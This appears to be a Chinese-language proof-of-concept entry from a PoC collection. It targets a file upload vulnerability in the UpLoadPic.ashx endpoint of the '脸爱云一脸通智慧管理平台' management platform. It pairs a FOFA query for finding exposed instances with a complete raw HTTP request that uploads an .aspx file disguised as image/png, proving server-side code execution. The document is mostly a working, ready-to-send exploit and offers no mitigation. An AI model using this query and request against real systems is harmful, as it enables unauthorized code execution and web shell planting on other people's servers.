## 脸爱云一脸通智慧管理平台存在UpLoadPic.ashx文件上传漏洞

## fofa
```
body="View/UserReserved/UserReservedTest.aspx"
```

## poc
```
POST /UpLoadPic.ashx HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Length: 431
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u
X-Requested-With: XMLHttpRequest

------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="action"

post
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="myPhoto"; filename="1.aspx"
Content-Type: image/png

<% response.write("FC5E038D38A57032085441E7FE7010B0") %>

------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="oldName"


------WebKitFormBoundarywt7cEu1eBdibB13u--
```

![619efcae85a32a8fdae1b493ff2b8959](https://github.com/wy876/POC/assets/139549762/e9fd66c1-a64f-4f77-be49-cd53198aabe9)
